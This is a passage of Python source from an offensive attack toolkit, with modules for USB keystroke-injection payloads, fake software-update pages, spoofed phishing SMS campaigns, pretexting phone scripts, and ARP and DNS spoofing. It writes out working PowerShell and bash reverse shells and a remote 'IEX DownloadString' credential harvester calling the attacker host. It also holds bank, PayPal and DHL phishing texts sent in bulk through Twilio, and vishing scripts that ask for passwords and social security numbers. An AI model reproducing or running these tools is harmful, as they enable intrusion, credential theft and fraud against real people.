        print(f" Unsubscribes: {Fore.WHITE}{campaign[14]} ({(campaign[14]/campaign[10]*100) if campaign[10] > 0 else 0:.1f}%){Style.RESET_ALL}")
        print(f" Bounces: {Fore.WHITE}{campaign[15]} ({(campaign[15]/campaign[10]*100) if campaign[10] > 0 else 0:.1f}%){Style.RESET_ALL}")
        
        # A/B Testing results
        if campaign[17]: # ab_testing
            print(f"\n{Fore.BLUE} A/B Testing Results:{Style.RESET_ALL}")
            cursor.execute('''
                SELECT ab_variant, COUNT(*) as sent, 
                       SUM(CASE WHEN opened_at IS NOT NULL THEN 1 ELSE 0 END) as opens,
                       SUM(CASE WHEN clicked_at IS NOT NULL THEN 1 ELSE 0 END) as clicks
                FROM recipients WHERE campaign_id = ? AND status = 'sent'
                GROUP BY ab_variant
            ''', (campaign_id,))
            
            variants = cursor.fetchall()
            for variant in variants:
                open_rate = (variant[2]/variant[1]*100) if variant[1] > 0 else 0
                click_rate = (variant[3]/variant[1]*100) if variant[1] > 0 else 0
                print(f" Variant {variant[0]}: {variant[1]} sent, {variant[2]} opens ({open_rate:.1f}%), {variant[3]} clicks ({click_rate:.1f}%)")
        
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        
        conn.close()
    
    def _export_mass_mailer_results(self, config, campaign_id):
        """Export campaign results to multiple formats"""
        export_format = config.get('export_format', 'all')
        db_file = config.get('db_file', 'mass_mailer.db')
        campaign_name = config.get('campaign_name', 'mass_campaign')
        
        print(f"\n{Fore.CYAN}Exporting results...{Style.RESET_ALL}")
        
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        
        # Get campaign data
        cursor.execute('SELECT * FROM campaigns WHERE id = ?', (campaign_id,))
        campaign = cursor.fetchone()
        
        cursor.execute('''
            SELECT email, first_name, last_name, company, status, sent_at, opened_at, clicked_at, ab_variant
            FROM recipients WHERE campaign_id = ?
        ''', (campaign_id,))
        recipients = cursor.fetchall()
        
        conn.close()
        
        # CSV Export
        if export_format in ['csv', 'all']:
            csv_file = f"{campaign_name}_export.csv"
            with open(csv_file, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(['Email', 'First Name', 'Last Name', 'Company', 'Status', 'Sent At', 'Opened At', 'Clicked At', 'Variant'])
                for r in recipients:
                    writer.writerow(r)
            print(f"{Fore.GREEN} CSV exported: {Fore.WHITE}{csv_file}{Style.RESET_ALL}")
        
        # JSON Export
        if export_format in ['json', 'all']:
            json_file = f"{campaign_name}_export.json"
            data = {
                'campaign': {
                    'name': campaign[1],
                    'template': campaign[2],
                    'created_at': campaign[3],
                    'duration': (campaign[7] - campaign[6]) if campaign[6] and campaign[7] else 0
                },
                'statistics': {
                    'total_recipients': campaign[9],
                    'emails_sent': campaign[10],
                    'emails_failed': campaign[11],
                    'opens': campaign[12],
                    'clicks': campaign[13],
                    'unsubscribes': campaign[14],
                    'bounces': campaign[15]
                },
                'recipients': [
                    {
                        'email': r[0],
                        'first_name': r[1],
                        'last_name': r[2],
                        'company': r[3],
                        'status': r[4],
                        'sent_at': r[5],
                        'opened_at': r[6],
                        'clicked_at': r[7],
                        'variant': r[8]
                    } for r in recipients
                ]
            }
            with open(json_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2)
            print(f"{Fore.GREEN} JSON exported: {Fore.WHITE}{json_file}{Style.RESET_ALL}")
        
        # HTML Report
        if export_format in ['html', 'all']:
            html_file = f"{campaign_name}_report.html"
            self._generate_mass_mailer_html_report(campaign, recipients, html_file)
            print(f"{Fore.GREEN} HTML report: {Fore.WHITE}{html_file}{Style.RESET_ALL}")
    
    def _generate_mass_mailer_html_report(self, campaign, recipients, output_file):
        """Generate professional HTML report"""
        html = f'''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Mass Mailer Report</title>
<style>
body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
.container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
h1 {{ color: #333; border-bottom: 3px solid #007bff; padding-bottom: 10px; }}
.stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }}
.stat-card {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 8px; text-align: center; }}
.stat-card h3 {{ margin: 0; font-size: 32px; }}
.stat-card p {{ margin: 5px 0 0 0; opacity: 0.9; }}
table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
th {{ background: #007bff; color: white; padding: 12px; text-align: left; }}
td {{ padding: 10px; border-bottom: 1px solid #ddd; }}
tr:hover {{ background: #f8f9fa; }}
.status-sent {{ color: #28a745; font-weight: bold; }}
.status-failed {{ color: #dc3545; font-weight: bold; }}
</style></head><body>
<div class="container">
<h1> Mass Mailer Campaign Report</h1>
<p><strong>Campaign:</strong> {campaign[1]}</p>
<p><strong>Template:</strong> {campaign[2]}</p>
<div class="stats">
<div class="stat-card"><h3>{campaign[10]}</h3><p>Emails Sent</p></div>
<div class="stat-card"><h3>{campaign[12]}</h3><p>Opens</p></div>
<div class="stat-card"><h3>{campaign[13]}</h3><p>Clicks</p></div>
<div class="stat-card"><h3>{(campaign[12]/campaign[10]*100) if campaign[10] > 0 else 0:.1f}%</h3><p>Open Rate</p></div>
</div>
<h2>Recipients</h2>
<table>
<tr><th>Email</th><th>Name</th><th>Company</th><th>Status</th><th>Variant</th></tr>
'''
        for r in recipients:
            status_class = 'status-sent' if r[4] == 'sent' else 'status-failed'
            html += f'<tr><td>{r[0]}</td><td>{r[1]} {r[2]}</td><td>{r[3]}</td><td class="{status_class}">{r[4]}</td><td>{r[8]}</td></tr>'
        
        html += '''</table></div></body></html>'''
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html)
    
    # ========== MAIN MASS MAILER FUNCTION ==========
    
    def run_mass_mailer(self):
        """Enterprise mass email campaign manager with templates, scheduling & analytics"""
        # Resolve configuration
        config = self.module_options.copy()
        
        # Display configuration
        self._display_mass_mailer_config(config)
        
        # Get available templates
        templates = self._get_mass_mailer_templates()
        template_name = config.get('template', 'newsletter')
        
        if template_name not in templates:
            print(f"{Fore.RED} Template '{template_name}' not found{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Available templates: {', '.join(templates.keys())}{Style.RESET_ALL}")
            return
        
        template = templates[template_name]
        print(f"{Fore.GREEN} Template: {Fore.WHITE}{template['name']}{Style.RESET_ALL}")
        print(f"{Fore.CYAN} Category: {Fore.WHITE}{template['category']}{Style.RESET_ALL}")
        print(f"{Fore.CYAN} Subject: {Fore.WHITE}{template['subject']}{Style.RESET_ALL}\n")
        
        # Confirmation prompt
        if config.get('auto_execute', 'false') != 'true':
            response = input(f"{Fore.YELLOW}Start campaign? (yes/no): {Style.RESET_ALL}").strip().lower()
            if response != 'yes':
                print(f"{Fore.RED}Campaign cancelled{Style.RESET_ALL}")
                return
        
        # Initialize campaign
        campaign_id = self._initialize_mass_mailer_campaign(config)
        if not campaign_id:
            return
        
        # Load recipients
        recipient_count = self._load_mass_mailer_recipients(config, campaign_id)
        if recipient_count == 0:
            return
        
        # Execute campaign
        self._execute_mass_mailer_campaign(config, campaign_id)
        
        # Display results
        self._display_mass_mailer_results(config, campaign_id)
        
        # Export results
        if config.get('export_results', 'true') == 'true':
            self._export_mass_mailer_results(config, campaign_id)
        
        print(f"\n{Fore.GREEN} Mass mailer campaign completed successfully{Style.RESET_ALL}\n")
    
    def run_qr_generator(self):
        """Malicious QR code generator"""
        url = self.module_options.get('url', 'http://malicious-site.com')
        output = self.module_options.get('output', 'qr_code.png')
        size = int(self.module_options.get('size', '300'))
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ QR CODE GENERATOR ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Target URL: {Fore.WHITE}{url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Output: {Fore.WHITE}{output}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Size: {Fore.WHITE}{size}x{size}px{Style.RESET_ALL}\n")
        
        if QRCODE_AVAILABLE:
            qr = qrcode.QRCode(version=1, box_size=10, border=4)
            qr.add_data(url)
            qr.make(fit=True)

            img = qr.make_image(fill_color="black", back_color="white")
            img.save(output)

            print(f"{Fore.GREEN} QR code generated successfully!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}→ Saved to: {Fore.WHITE}{output}{Style.RESET_ALL}\n")
        else:
            print(f"{Fore.YELLOW} qrcode library not installed{Style.RESET_ALL}")
            print(f"{Fore.BLUE}ℹ Install with: {Fore.CYAN}pip install qrcode[pil]{Style.RESET_ALL}\n")

            # Generate ASCII QR for demo
            print(f"{Fore.CYAN}ASCII Preview (install qrcode for actual image):{Style.RESET_ALL}\n")
            print(f" ████████████████ ████ ██████████")
            print(f" ██ ██ ██ ██ ██")
            print(f" ██ ██████ ██ ████ ██ ████ ██")
            print(f" ██ ██████ ██ ██ ██ ████ ██")
            print(f" ██ ██████ ██ ██ ██ ████ ██")
            print(f" ██ ██ ██████████ ██")
            print(f" ████████████████ ██ ██████████\n")
            
        print(f"{Fore.BLUE}ℹ Use cases:{Style.RESET_ALL}")
        print(f" • Physical security testing")
        print(f" • Parking lot drops")
        print(f" • Fake WiFi posters")
        print(f" • Fake payment terminals{Style.RESET_ALL}")
    
    def run_usb_payload(self):
        """USB payload generator (BadUSB/Rubber Ducky)"""
        payload_type = self.module_options.get('payload_type', 'reverse_shell')
        target_os = self.module_options.get('target_os', 'windows')
        lhost = self.module_options.get('lhost', self.config['lhost'])
        lport = self.module_options.get('lport', '4444')
        output = self.module_options.get('output', 'payload.txt')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ USB PAYLOAD GENERATOR ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Payload Type: {Fore.WHITE}{payload_type}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Target OS: {Fore.WHITE}{target_os}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}LHOST: {Fore.WHITE}{lhost}:{lport}{Style.RESET_ALL}\n")
        
        if target_os == 'windows' and payload_type == 'reverse_shell':
            payload = f"""REM Windows Reverse Shell - Rubber Ducky Script
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
ENTER
STRING $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};
ENTER
STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
ENTER
STRING $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
ENTER
STRING $sendback = (iex $data 2>&1 | Out-String );
ENTER
STRING $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
ENTER
STRING $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
ENTER
STRING $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}
ENTER
STRING $client.Close()
ENTER
"""
        elif target_os == 'windows' and payload_type == 'credentials':
            payload = f"""REM Windows Credential Harvester
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 500
STRING powershell -WindowStyle Hidden \"IEX (New-Object Net.WebClient).DownloadString('http://{lhost}/harvest.ps1')\"
ENTER
DELAY 2000
STRING exit
ENTER
"""
        elif target_os == 'linux':
            payload = f"""REM Linux Reverse Shell
DELAY 1000
CTRL-ALT t
DELAY 500
STRING bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
ENTER
DELAY 500
STRING exit
ENTER
"""
        else:
            payload = "REM Custom payload - modify as needed\n"
        
        # Save payload
        try:
            with open(output, 'w') as f:
                f.write(payload)
            
            print(f"{Fore.GREEN} Payload generated!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}→ Saved to: {Fore.WHITE}{output}{Style.RESET_ALL}\n")
            print(f"{Fore.BLUE}Preview:{Style.RESET_ALL}\n{Fore.CYAN}{payload[:300]}...{Style.RESET_ALL}\n")
            
        except Exception as e:
            print(f"{Fore.RED} Error saving payload: {str(e)}{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW} Devices:{Style.RESET_ALL}")
        print(f" • USB Rubber Ducky")
        print(f" • Bash Bunny")
        print(f" • Teensy")
        print(f" • Arduino-based BadUSB")
        print(f"\n{Fore.BLUE}ℹ Remember to start listener: {Fore.CYAN}use exploit/multi_handler{Style.RESET_ALL}")
    
    def run_fake_update(self):
        """Fake software update page generator"""
        software = self.module_options.get('software', 'chrome')
        payload = self.module_options.get('payload', 'update.exe')
        port = self.module_options.get('port', '8080')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ FAKE UPDATE GENERATOR ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        templates = {
            'chrome': {
                'title': 'Chrome Update Required',
                'message': 'A new version of Chrome is available',
                'button': 'Update Chrome'
            },
            'firefox': {
                'title': 'Firefox Update Available',
                'message': 'Firefox must be updated to continue',
                'button': 'Update Firefox'
            },
            'flash': {
                'title': 'Flash Player Update',
                'message': 'Flash Player is out of date',
                'button': 'Update Flash Player'
            },
            'windows': {
                'title': 'Windows Security Update',
                'message': 'Critical security update required',
                'button': 'Install Update'
            }
        }
        
        template = templates.get(software, templates['chrome'])
        
        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>{template['title']}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            background: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }}
        .update-box {{
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
        }}
        .icon {{
            font-size: 64px;
            margin-bottom: 20px;
        }}
        h1 {{
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
        }}
        p {{
            color: #666;
            margin-bottom: 30px;
        }}
        .update-btn {{
            background: #4285f4;
            color: white;
            border: none;
            padding: 12px 30px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
        }}
        .update-btn:hover {{
            background: #357ae8;
        }}
    </style>
</head>
<body>
    <div class="update-box">
        <div class="icon">️</div>
        <h1>{template['title']}</h1>
        <p>{template['message']}</p>
        <a href="/{payload}" download>
            <button class="update-btn">{template['button']}</button>
        </a>
    </div>
</body>
</html>"""
        
        output_dir = f"fake_update_{software}"
        os.makedirs(output_dir, exist_ok=True)
        
        with open(f"{output_dir}/index.html", 'w') as f:
            f.write(html_content)
        
        print(f"{Fore.GREEN} Fake update page generated!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}→ Location: {Fore.WHITE}{output_dir}/index.html{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW} Setup:{Style.RESET_ALL}")
        print(f" 1. Place payload: {Fore.CYAN}cp malware.exe {output_dir}/{payload}{Style.RESET_ALL}")
        print(f" 2. Start server: {Fore.CYAN}python3 -m http.server {port} --directory {output_dir}{Style.RESET_ALL}")
        print(f" 3. Access at: {Fore.CYAN}http://{self.config['lhost']}:{port}{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}ℹ Delivery methods:{Style.RESET_ALL}")
        print(f" • Watering hole attacks")
        print(f" • Compromised websites")
        print(f" • Malicious ads")
        print(f" • Email campaigns")
    
    def run_sms_spoofing(self):
        """SMS spoofing campaign"""
        message = self.module_options.get('message', 'Your package is ready. Track: {link}')
        sender = self.module_options.get('sender', 'DHL')
        targets_file = self.module_options.get('targets', 'phones.txt')
        twilio_sid = self.module_options.get('twilio_sid', '')
        twilio_token = self.module_options.get('twilio_token', '')
        twilio_number = self.module_options.get('twilio_number', '')
        link = self.module_options.get('link', 'http://track.example.com/123')
        delay = int(self.module_options.get('delay', '2'))
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ SMS SPOOFING CAMPAIGN ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Sender Display: {Fore.WHITE}{sender}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Message: {Fore.WHITE}{message}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Targets File: {Fore.WHITE}{targets_file}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Delay: {Fore.WHITE}{delay}s between messages{Style.RESET_ALL}\n")
        
        # Replace variables in message
        import random
        final_message = message.replace('{link}', link)
        final_message = final_message.replace('{random}', str(random.randint(100000, 999999)))
        
        # Check if Twilio credentials are provided
        if twilio_sid and twilio_token and twilio_number:
            if not TWILIO_AVAILABLE or TwilioClient is None:
                print(f"{Fore.YELLOW} Twilio library not installed{Style.RESET_ALL}")
                print(f"{Fore.BLUE}ℹ Install with: {Fore.CYAN}pip install twilio{Style.RESET_ALL}\n")
                print(f"{Fore.BLUE}ℹ Or use alternative methods below{Style.RESET_ALL}\n")
            else:
                if not os.path.exists(targets_file):
                    print(f"{Fore.YELLOW} Target file not found. Creating example file...{Style.RESET_ALL}\n")
                    with open(targets_file, 'w') as f:
                        f.write("+1234567890,John Doe\n")
                        f.write("+0987654321,Jane Smith\n")
                    print(f"{Fore.GREEN} Created example file: {targets_file}{Style.RESET_ALL}")
                    print(f"{Fore.BLUE}ℹ Edit the file and run again{Style.RESET_ALL}\n")
                    return

                targets = []
                with open(targets_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            parts = line.split(',', 1)
                            phone = parts[0].strip()
                            name = parts[1].strip() if len(parts) > 1 else 'User'
                            targets.append({'phone': phone, 'name': name})

                if not targets:
                    print(f"{Fore.RED} No targets found in {targets_file}{Style.RESET_ALL}\n")
                    return

                print(f"{Fore.GREEN} Loaded {len(targets)} target(s){Style.RESET_ALL}\n")

                client = TwilioClient(twilio_sid, twilio_token)
                print(f"{Fore.CYAN}┌─[ SENDING SMS ]───────────────────────────{Style.RESET_ALL}")

                success_count = 0
                fail_count = 0

                for i, target in enumerate(targets, 1):
                    personalized_msg = final_message.replace('{name}', target['name'])
                    try:
                        message_obj = client.messages.create(
                            body=personalized_msg,
                            from_=twilio_number,
                            to=target['phone']
                        )
                        print(f"{Fore.GREEN}│ [{i}/{len(targets)}] Sent to {target['phone']} ({target['name']}) - SID: {message_obj.sid[:20]}...{Style.RESET_ALL}")
                        success_count += 1
                        if i < len(targets):
                            time.sleep(delay)
                    except Exception as e:
                        print(f"{Fore.RED}│ [{i}/{len(targets)}] Failed to {target['phone']} - Error: {str(e)[:50]}{Style.RESET_ALL}")
                        fail_count += 1

                print(f"{Fore.CYAN}└────────────────────────────────────────────{Style.RESET_ALL}\n")
                print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
                print(f"{Fore.CYAN}║ CAMPAIGN SUMMARY ║{Style.RESET_ALL}")
                print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
                print(f"{Fore.GREEN} Successfully sent: {success_count}{Style.RESET_ALL}")
                print(f"{Fore.RED} Failed: {fail_count}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Total targets: {len(targets)}{Style.RESET_ALL}\n")
                
        else:
            print(f"{Fore.YELLOW} Twilio credentials not configured{Style.RESET_ALL}\n")
            print(f"{Fore.BLUE}ℹ Configure with:{Style.RESET_ALL}")
            print(f"{Fore.CYAN} set twilio_sid <your_account_sid>")
            print(f" set twilio_token <your_auth_token>")
            print(f" set twilio_number <your_twilio_number>{Style.RESET_ALL}\n")
            print(f"{Fore.BLUE}ℹ Get credentials from: https://www.twilio.com/console{Style.RESET_ALL}\n")
        
        # Show example templates
        print(f"{Fore.GREEN}Example SMS templates:{Style.RESET_ALL}\n")
        
        templates = [
            ("DHL Delivery", "Your package is awaiting delivery. Track: {link}"),
            ("Bank Alert", "Unusual activity on card ending in 4532. Verify: {link}"),
            ("PayPal Security", "Your account has been limited. Restore access: {link}"),
            ("Amazon Order", "Order #{random} delivered. Issues? {link}"),
            ("Netflix Billing", "Payment failed. Update billing: {link}")
        ]
        
        for i, (name, template) in enumerate(templates, 1):
            print(f"{Fore.CYAN}{i}. {name}:{Style.RESET_ALL}")
            print(f" {Fore.WHITE}{template}{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}ℹ Alternative implementation methods:{Style.RESET_ALL}")
        print(f" • Twilio API (recommended - supports sender ID in some countries)")
        print(f" • Nexmo/Vonage API")
        print(f" • AWS SNS (limited sender ID support)")
        print(f" • SMS gateway providers")
        print(f"\n{Fore.BLUE}ℹ Target file format ({targets_file}):{Style.RESET_ALL}")
        print(f"{Fore.CYAN} +1234567890,John Doe")
        print(f" +0987654321,Jane Smith")
        print(f" +4412345678,Alice Brown{Style.RESET_ALL}")
    
    def run_pretexting(self):
        """Pretexting scenario generator"""
        scenario = self.module_options.get('scenario', 'it_support')
        company = self.module_options.get('company', 'TechCorp')
        urgency = self.module_options.get('urgency', 'high')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ PRETEXTING SCENARIO GENERATOR ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        scenarios = {
            'it_support': {
                'role': 'IT Support Technician',
                'opening': f"Hi, this is Alex from {company} IT Support. We've detected some suspicious activity on your account.",
                'urgency_reason': 'Your account may be compromised. We need to verify your identity immediately.',
                'request': 'Can you verify your employee ID and current password so I can reset it for you?',
                'alternative': 'Could you click this verification link to secure your account?'
            },
            'vendor': {
                'role': 'Vendor/Supplier',
                'opening': f"Good morning, I'm calling from {company}'s main supplier. We need to update our billing information.",
                'urgency_reason': 'Our payment system was updated and we need to confirm your details to avoid service interruption.',
                'request': 'Can you provide the accounts payable contact and their email?',
                'alternative': 'Could you forward this billing update form to your finance department?'
            },
            'executive': {
                'role': 'Executive Assistant',
                'opening': f"Hi, I'm calling on behalf of {company}'s CEO who is traveling.",
                'urgency_reason': 'The CEO needs urgent access to a file for a board meeting happening in 30 minutes.',
                'request': 'Can you email the Q4 financial report to this temporary address?',
                'alternative': 'Could you reset the CEO\'s VPN password and send it to me?'
            },
            'hr': {
                'role': 'HR Representative',
                'opening': f"Hello, this is Sarah from {company} Human Resources.",
                'urgency_reason': 'We need to update employee records before the audit tomorrow.',
                'request': 'Can you verify your social security number and home address?',
                'alternative': 'Please fill out this employee verification form we\'re emailing you.'
            },
            'security': {
                'role': 'Security Officer',
                'opening': f"This is Officer Johnson from {company} Corporate Security.",
                'urgency_reason': 'We detected unauthorized access attempts to your account.',
                'request': 'I need you to change your password right now while I verify your identity.',
                'alternative': 'Click this secure link to update your security settings immediately.'
            }
        }
        
        if scenario in scenarios:
            s = scenarios[scenario]
            print(f"{Fore.YELLOW}Scenario: {Fore.WHITE}{scenario.replace('_', ' ').title()}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Role: {Fore.WHITE}{s['role']}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Company: {Fore.WHITE}{company}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Urgency: {Fore.WHITE}{urgency.upper()}{Style.RESET_ALL}\n")
            
            print(f"{Fore.CYAN}═══ SCRIPT ═══{Style.RESET_ALL}\n")
            print(f"{Fore.GREEN}Opening:{Style.RESET_ALL}")
            print(f"{Fore.WHITE}\"{s['opening']}\"{Style.RESET_ALL}\n")
            
            print(f"{Fore.YELLOW}Urgency Factor:{Style.RESET_ALL}")
            print(f"{Fore.WHITE}\"{s['urgency_reason']}\"{Style.RESET_ALL}\n")
            
            print(f"{Fore.RED}Primary Request:{Style.RESET_ALL}")
            print(f"{Fore.WHITE}\"{s['request']}\"{Style.RESET_ALL}\n")
            
            print(f"{Fore.BLUE}Alternative Approach:{Style.RESET_ALL}")
            print(f"{Fore.WHITE}\"{s['alternative']}\"{Style.RESET_ALL}\n")
            
            print(f"{Fore.CYAN}═══ TIPS ═══{Style.RESET_ALL}\n")
            print(f" • Use confident, authoritative tone")
            print(f" • Build rapport before making requests")
            print(f" • Create time pressure with urgency")
            print(f" • Use company-specific terminology")
            print(f" • Have plausible answers for questions")
            print(f" • Know when to abandon if suspicious\n")
    
    # ============ NETWORK ATTACK MODULES ============
    
    def run_arp_spoof(self):
        """ARP spoofing / Man-in-the-Middle attack"""
        target_ip = self.module_options.get('target_ip', '192.168.1.100')
        gateway_ip = self.module_options.get('gateway_ip', '192.168.1.1')
        interface = self.module_options.get('interface', 'eth0')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ ARP SPOOFING ATTACK ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Target: {Fore.WHITE}{target_ip}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Gateway: {Fore.WHITE}{gateway_ip}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Interface: {Fore.WHITE}{interface}{Style.RESET_ALL}\n")
        
        if not SCAPY_AVAILABLE:
            print(f"{Fore.RED} Scapy not available{Style.RESET_ALL}")
            print(f"{Fore.BLUE}ℹ Install: {Fore.CYAN}pip install scapy{Style.RESET_ALL}\n")
            return
        
        print(f"{Fore.YELLOW} Prerequisites:{Style.RESET_ALL}")
        print(f" 1. Enable IP forwarding:")
        print(f" {Fore.CYAN}echo 1 > /proc/sys/net/ipv4/ip_forward{Style.RESET_ALL}")
        print(f" 2. Run as root{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}Python implementation:{Style.RESET_ALL}\n")
        print(f"{Fore.CYAN}from scapy.all import ARP, send")
        print(f"import time")
        print(f"")
        print(f"def arp_spoof(target_ip, gateway_ip):")
        print(f" target_mac = getmacbyip(target_ip)")
        print(f" gateway_mac = getmacbyip(gateway_ip)")
        print(f" ")
        print(f" # Poison target")
        print(f" arp_target = ARP(op=2, pdst=target_ip, hwdst=target_mac,")
        print(f" psrc=gateway_ip)")
        print(f" # Poison gateway")
        print(f" arp_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,")
        print(f" psrc=target_ip)")
        print(f" ")
        print(f" while True:")
        print(f" send(arp_target, verbose=False)")
        print(f" send(arp_gateway, verbose=False)")
        print(f" time.sleep(2){Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}ℹ Once MITM is active, use:{Style.RESET_ALL}")
        print(f" • {Fore.CYAN}use network/packet_sniffer{Fore.WHITE} - Capture traffic")
        print(f" • {Fore.CYAN}use network/ssl_strip{Fore.WHITE} - Downgrade HTTPS")
        print(f" • {Fore.CYAN}use network/dns_spoof{Fore.WHITE} - Redirect domains{Style.RESET_ALL}")
    
    def run_dns_spoof(self):
        """DNS spoofing attack"""
        domain = self.module_options.get('domain', 'google.com')
        fake_ip = self.module_options.get('fake_ip', '192.168.1.100')
        interface = self.module_options.get('interface', 'eth0')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ DNS SPOOFING ATTACK ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Domain: {Fore.WHITE}{domain}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Fake IP: {Fore.WHITE}{fake_ip}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Interface: {Fore.WHITE}{interface}{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}Tool options:{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}1. Using dnsspoof (dsniff):{Style.RESET_ALL}")
        print(f" {Fore.CYAN}echo '{domain} {fake_ip}' > dns.txt")
        print(f" sudo dnsspoof -i {interface} -f dns.txt{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}2. Using Bettercap:{Style.RESET_ALL}")
        print(f" {Fore.CYAN}sudo bettercap -iface {interface}")
        print(f" > set dns.spoof.domains {domain}")
        print(f" > set dns.spoof.address {fake_ip}")
        print(f" > dns.spoof on{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}3. Using Scapy:{Style.RESET_ALL}")
        print(f" {Fore.CYAN}# Sniff DNS queries and respond with fake IP{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW} Requires active MITM (ARP spoofing first){Style.RESET_ALL}")
        print(f"{Fore.BLUE}ℹ Common targets: login.microsoft.com, accounts.google.com{Style.RESET_ALL}")
    
    def run_dhcp_starvation(self):
        """DHCP starvation attack"""
        interface = self.module_options.get('interface', 'eth0')
        count = int(self.module_options.get('count', '100'))
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ DHCP STARVATION ATTACK ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
